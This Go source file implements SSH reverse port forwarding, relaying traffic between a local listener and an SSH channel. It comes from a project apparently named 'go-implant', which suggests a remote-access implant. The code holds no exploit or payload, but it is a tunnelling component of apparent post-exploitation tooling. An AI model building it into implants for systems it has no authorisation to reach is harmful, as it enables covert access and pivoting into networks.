// +build !windows

// is this needed???

package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

type tcpIPForwardRequest struct {
	AddressToBind    string
	PortNumberToBind uint32
}

func serveReversePortForward(connection ssh.Channel, stopchannel chan struct{}) {

	log.Printf("in serveReversePortForward")

	// don't trust port number from client
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Print(err)
		return
	}

	// spawn goroutine to stop the server when stopchannel gets closed
	go func() {
		<-stopchannel
		listener.Close()
	}()

	// tell user about the tunnel
	color.Set(color.FgGreen)
	log.Printf("New SSH tunnel created on %s (client uid here)", listener.Addr().String())
	color.Unset()

	defer listener.Close()

	for {

		// accept clients
		localConn, err := listener.Accept()
		if err != nil {
			log.Print(err)
			return
		}

		// forward traffic between the localConn and connection
		go func() {

			defer localConn.Close()
			chDone := make(chan bool)

			// Start connection -> remote data transfer
			go func() {
				_, err := io.Copy(connection, localConn)
				if config.DEBUG {
					if err != nil {
						log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
					}
				}
				chDone <- true
			}()

			// Start remote -> connection data transfer
			go func() {
				_, err := io.Copy(localConn, connection)
				if err != nil {
					if config.DEBUG {
						log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
					}
				}
				chDone <- true
			}()

			<-chDone // block until copying returns
		}()
	}
}
